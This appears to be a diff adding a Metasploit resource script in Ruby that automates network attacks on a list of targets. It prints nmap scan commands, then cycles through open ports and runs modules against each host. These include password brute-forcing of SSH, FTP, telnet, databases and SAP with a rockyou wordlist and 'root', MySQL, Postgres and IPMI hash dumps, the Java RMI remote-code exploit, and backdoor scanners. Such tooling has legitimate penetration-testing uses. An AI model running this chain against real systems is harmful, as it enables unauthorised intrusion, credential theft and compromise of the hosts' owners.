@@ -1,0 +1,757 @@
+<ruby>
+ports = []
+ports << "21"
+ports << "22"
+ports << "23"
+ports << "79"
+ports << "80"
+ports << "111"
+ports << "123"
+ports << "135"
+ports << "443"
+#ports << "445"
+ports << "512"
+ports << "513"
+ports << "548"
+#ports << "623"
+ports << "902"
+#ports << "998"
+ports << "1098"
+ports << "1099"
+ports << "1128"
+ports << "1158"
+#ports << "1241"
+#ports << "1433"
+ports << "1521"
+ports << "1720"
+ports << "1900"
+#ports << "3000"
+#ports << "3100"
+ports << "3299"
+ports << "3306"
+ports << "3500"
+ports << "5000"
+ports << "5038"
+ports << "5060"
+ports << "5432"
+ports << "5560"
+ports << "5631"
+#ports << "5900"
+#ports << "5920"
+#ports << "5984"
+#ports << "5985"
+ports << "6000"
+ports << "6106"
+ports << "6379"
+ports << "8000"
+ports << "8080"
+ports << "8161"
+ports << "8222"
+ports << "8834"
+ports << "9000"
+ports << "9084"
+ports << "9100"
+ports << "9200"
+ports << "10000"
+ports << "10001"
+ports << "11211"
+ports << "13364"
+ports << "17185"
+ports << "27017"
+ports << "32764"
+ports << "49152"
+ports << "50000"
+ports << "50013"
+portList = ""
+for port in ports
+	portList << port << ","
+end
+puts portList
+
+puts "nmap -oA nmapt_target -iL target.txt -Pn -T4 -sT -n -sV -p "+portList+" -A  -v -script default,ssl-heartbleed --script-args vulns.showall"
+puts "nmap -oA nmapt_target -iL target.txt -Pn -T4 -sT -n -sV --top-ports 1000  -A  -v -script default,ssl-heartbleed --script-args vulns.showall"
+for port in ports
+	if not File.exist?"host"+port+".txt"
+		puts "cat nmapt_target.gnmap | grep '"+port+"/open' | awk '{print $2}'> host"+port+".txt"
+	end
+	hosts = []
+
+	filename = "host"+port+".txt"
+	if not File.exist?filename
+		hosts << "127.0.0.1"
+	else
+		f = File.open("host"+port+".txt","r")
+		#f = File.open(ARGV[0],"r")
+		f.each_line do |line|
+			if not line.nil?
+				hosts << line
+			end
+		end
+		f.close
+	end
+	self.run_single("spool msfconsole.log")
+	self.run_single("setg VERBOSE true")
+	self.run_single("setg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt")
+	self.run_single("setg USERNAME root")
+	self.run_single("setg USER_AS_PASS true")
+	
+	exploitList = []
+	if port=="22"
+		exploitList << "use auxiliary/scanner/ssh/cerberus_sftp_enumusers"
+		exploitList << "use auxiliary/scanner/ssh/ssh_enumusers"
+		exploitList << "use auxiliary/scanner/ssh/ssh_identify_pubkeys"
+		exploitList << "use auxiliary/scanner/ssh/ssh_login"
+		exploitList << "use auxiliary/scanner/ssh/ssh_login_pubkey"
+		exploitList << "use auxiliary/scanner/ssh/ssh_version"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="80" or port=="443" or port=="8080"
+		exploitList << "use auxiliary/scanner/http/backup_file"
+		exploitList << "use auxiliary/scanner/http/brute_dirs"
+		exploitList << "use auxiliary/scanner/http/dir_scanner"
+		exploitList << "use auxiliary/scanner/http/dir_webdav_unicode_bypass"
+		exploitList << "use auxiliary/scanner/http/nginx_source_disclosure"
+	end
+	if port=="443"
+		self.run_single("setg SSL true")
+		puts "nmap --script ssl-known-key -p 443 -iL hosts_port443.txt"
+		exploitList << "use auxiliary/scanner/http/tomcat_enum"
+		exploitList << "use auxiliary/scanner/http/tomcat_mgr_login"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="8080"
+		exploitList << "use auxiliary/scanner/http/jboss_status"
+		exploitList << "use auxiliary/scanner/http/jboss_vulnscan"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="445"
+		puts "nmap --script smb-brute.nse -p445 -iL hosts_port445.txt"
+	end
+	if port=="512"
+		exploitList << "use auxiliary/scanner/rservices/rexec_login"
+		exploitList << "use auxiliary/scanner/rservices/rlogin_login"
+		exploitList << "use auxiliary/scanner/rservices/rsh_login"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+
+	end
+	if port=="513"
+		puts "nmap -p 513 --script rlogin-brute -iL hosts_port513.txt"
+	end
+	if port=="548"
+		exploitList << "auxiliary/scanner/afp/afp_login"
+   		exploitList << "auxiliary/scanner/afp/afp_server_info"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="1098"
+		puts "nmap --script rmi-dumpregistry.nse -p 1098 -iL hosts_port1098.txt"
+	end
+	if port=="1099"
+		#nmap --script=rmi-vuln-classloader -p 1099 -iL host1099.txt
+		exploitList << "use exploit/multi/misc/java_rmi_server"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="623"
+		puts "ipmitool -I lanplus -C 0 -H x.x.x.x -U root -P password chassis status"
+
+		exploitList << "use auxiliary/scanner/ipmi/ipmi_cipher_zero"
+		exploitList << "use auxiliary/scanner/ipmi/ipmi_dumphashes"
+		exploitList << "use auxiliary/scanner/ipmi/ipmi_version"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end
+	if port=="21"
+		puts "nmap --script ftp-brute -p 21 -iL hosts_port21.txt"
+		puts "nmap --script ftp-proftpd-backdoor -p 21 -iL hosts_port21.txt"
+		puts "nmap --script ftp-vsftpd-backdoor -p 21 -iL hosts_port21.txt"
+		puts "nmap --script ftp-vuln-cve2010-4221 -p 21 -iL hosts_port21.txt"
+
+		exploitList << "use auxiliary/scanner/ftp/anonymous"
+		exploitList << "use auxiliary/scanner/ftp/ftp_login"
+		exploitList << "use auxiliary/scanner/ftp/ftp_version"
+		exploitList << "use auxiliary/scanner/ftp/titanftp_xcrc_traversal"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="23"
+		exploitList << "use auxiliary/scanner/telnet/lantronix_telnet_password"
+		exploitList << "use auxiliary/scanner/telnet/lantronix_telnet_version"
+		exploitList << "use auxiliary/scanner/telnet/telnet_encrypt_overflow"
+		exploitList << "use auxiliary/scanner/telnet/telnet_login"
+		exploitList << "use auxiliary/scanner/telnet/telnet_ruggedcom"
+		exploitList << "use auxiliary/scanner/telnet/telnet_version"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="79"
+		exploitList << "use auxiliary/scanner/finger/finger_users"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="111"
+		exploitList << "use auxiliary/scanner/misc/sunrpc_portmapper"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end		
+	if port=="123"
+		exploitList << "use auxiliary/scanner/ntp/ntp_monlist"
+		exploitList << "use auxiliary/scanner/ntp/ntp_readvar"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="135"
+		exploitList << "use auxiliary/scanner/dcerpc/hidden"
+		exploitList << "use auxiliary/scanner/dcerpc/management"
+		exploitList << "use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="902"
+		puts "nmap -p 902 --script vmauthd-brute -iL hosts_port902.txt"
+		exploitList << "use auxiliary/scanner/vmware/vmauthd_login"
+		exploitList << "use auxiliary/scanner/vmware/vmauthd_version"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="1521"
+		exploitList << "use auxiliary/scanner/oracle/sid_brute"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="1128"
+		exploitList << "use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="1158"
+		exploitList << "use auxiliary/scanner/oracle/emc_sid"
+		exploitList << "use auxiliary/scanner/oracle/spy_sid"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="1900"
+		puts "nmap -sU -p 1900 --script=upnp-info -iL hosts_port1900.txt"
+		exploitList << "use auxiliary/scanner/upnp/ssdp_msearch"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end	
+	if port=="1720"
+		exploitList << "use auxiliary/scanner/h323/h323_version"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="2010"	
+		puts "nmap -sT  -p 2010 --script=+jdwp-exec --script-args cmd=date -iL hosts_port2010.txt"
+	end
+	if port=="3299"
+		exploitList << "use auxiliary/scanner/sap/sap_router_info_request"
+		exploitList << "use auxiliary/scanner/sap/sap_router_portscanner"
+		exploitList << "use auxiliary/scanner/sap/sap_service_discovery"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="3306"
+		exploitList << "use auxiliary/scanner/mysql/mysql_authbypass_hashdump"
+		exploitList << "use auxiliary/scanner/mysql/mysql_file_enum"
+		exploitList << "use auxiliary/scanner/mysql/mysql_hashdump"
+		exploitList << "use auxiliary/scanner/mysql/mysql_login"
+		exploitList << "use auxiliary/scanner/mysql/mysql_schemadump"
+		exploitList << "use auxiliary/scanner/mysql/mysql_version"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+
+	end
+	if port=="3500"	
+		exploitList << "use auxiliary/scanner/emc/alphastor_librarymanager"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="5000"	
+		exploitList << "use auxiliary/admin/hp/hp_data_protector_cmd"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="5038"	
+		exploitList << "use auxiliary/voip/asterisk_login"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="5060"	
+		exploitList << "use auxiliary/scanner/sip/enumerator"
+		exploitList << "use auxiliary/scanner/sip/enumerator_tcp"
+		exploitList << "use auxiliary/scanner/sip/options"
+		exploitList << "use auxiliary/scanner/sip/options_tcp"
+		exploitList << "use auxiliary/scanner/sip/sipdroid_ext_enum"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="5432"	
+		puts "nmap -p 5432 --script pgsql-brute -iL hosts_port5432.txt"
+		exploitList << "use auxiliary/scanner/postgres/postgres_dbname_flag_injection"
+		exploitList << "use auxiliary/scanner/postgres/postgres_hashdump"
+		exploitList << "use auxiliary/scanner/postgres/postgres_login"
+		exploitList << "use auxiliary/scanner/postgres/postgres_schemadump"
+		exploitList << "use auxiliary/scanner/postgres/postgres_version"
+
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+
+	end
+	if port=="5560"
+		exploitList << "use auxiliary/scanner/oracle/isqlplus_sidbrute"
+		exploitList << "use auxiliary/scanner/oracle/isqlplus_login"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="5631"
+		exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_login"
+		exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_tcp"
+		exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_udp"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+
+	if port=="5900"	
+		puts "nmap --script vnc-brute -p 5900 -iL hosts_port5900.txt"
+	end
+	if port=="5985"	
+		exploitList << "use auxiliary/scanner/winrm/winrm_auth_methods"
+		exploitList << "use auxiliary/scanner/winrm/winrm_cmd"
+		exploitList << "use auxiliary/scanner/winrm/winrm_login"
+		exploitList << "use auxiliary/scanner/winrm/winrm_wql"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="6000"
+		exploitList << "use auxiliary/scanner/x11/open_x11"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end
+	if port=="6106"
+		exploitList << "use auxiliary/admin/backupexec/registry"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="6379"
+		exploitList << "use auxiliary/scanner/misc/redis_server"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="8000"
+		exploitList << "use auxiliary/admin/http/hp_web_jetadmin_exec"
+		exploitList << "use auxiliary/scanner/http/barracuda_directory_traversal"
+		exploitList << "use auxiliary/scanner/http/splunk_web_login"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+		
+	end
+	if port=="8222"	
+		puts "nmap --script http-vmware-path-vuln -p80,443,8222,8333 -iL hosts_port80.txt"
+	end
+	if port=="8333"	
+		puts "nmap --script http-vmware-path-vuln -p80,443,8222,8333 -iL hosts_port80.txt"
+	end
+	if port=="8161"
+		exploitList << "use auxiliary/scanner/http/apache_activemq_source_disclosure"
+		exploitList << "use auxiliary/scanner/http/apache_activemq_traversal"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end
+	if port=="8222"
+		exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_login"
+		exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_ping"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end
+	if port=="8834"
+		exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_login"
+		exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_ping"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end
+	if port=="9000"
+		exploitList << "use auxiliary/admin/http/axigen_file_access"
+		exploitList << "use auxiliary/scanner/misc/raysharp_dvr_passwords"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end
+	if port=="9084"
+		exploitList << "use auxiliary/scanner/http/vmware_update_manager_traversal"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end	
+	if port=="9100"	
+		exploitList << "use auxiliary/scanner/printer/printer_download_file"
+		exploitList << "use auxiliary/scanner/printer/printer_env_vars"
+		exploitList << "use auxiliary/scanner/printer/printer_list_dir"
+		exploitList << "use auxiliary/scanner/printer/printer_list_volumes"
+		exploitList << "use auxiliary/scanner/printer/printer_ready_message"
+		exploitList << "use auxiliary/scanner/printer/printer_version_info"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end
+	if port=="9200"	
+		exploitList << "use auxiliary/scanner/elasticsearch/indeces_enum"
+		exploitList << "use auxiliary/scanner/elasticsearch/indices_enum"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end
+	if port=="10000"
+		exploitList << "use auxiliary/admin/backupexec/dump"
+		exploitList << "use auxiliary/admin/webmin/file_disclosure"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end	
+	if port=="10001"	
+		exploitList << "use auxiliary/admin/zend/java_bridge"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end
+	if port=="11211"	
+		puts "nmap -p 11211 --script membase-brute -iL hosts_port11211.txt"
+	end
+	if port=="13364"	
+		exploitList << "use auxiliary/scanner/misc/rosewill_rxs3211_passwords"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end	
+	end
+	if port=="17185"	
+		exploitList << "use auxiliary/scanner/vxworks/wdbrpc_bootline"
+		exploitList << "use auxiliary/scanner/vxworks/wdbrpc_version"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="27017"	
+		exploitList << "use auxiliary/scanner/mongodb/mongodb_login"
+	end
+	if port=="32764"	
+		exploitList << "use auxiliary/scanner/misc/sercomm_backdoor_scanner"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="49152"	
+		exploitList << "use auxiliary/scanner/http/smt_ipmi_49152_exposure"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+		
+	end
+	if port=="50000"	
+		exploitList << "use auxiliary/scanner/db2/db2_auth"
+		exploitList << "use auxiliary/scanner/db2/db2_version"
+		exploitList << "use auxiliary/scanner/db2/discovery"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+	end
+	if port=="50013"	
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_abaplog"
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_brute_login"
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_extractusers"
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints"
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getenv"
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getlogfiles"
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getprocesslist"
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter"
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_instanceproperties"
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_listlogfiles"
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_startprofile"
+		exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_version"
+		for exp in exploitList
+			self.run_single(exp)
+			hosts.each do |net|
+				self.run_single("set RHOSTS #{net}")	
+				self.run_single("set RHOST #{net}")
+       				self.run_single("exploit")
+			end
+		end
+
+	end
+	self.run_single("exit")
+end
+
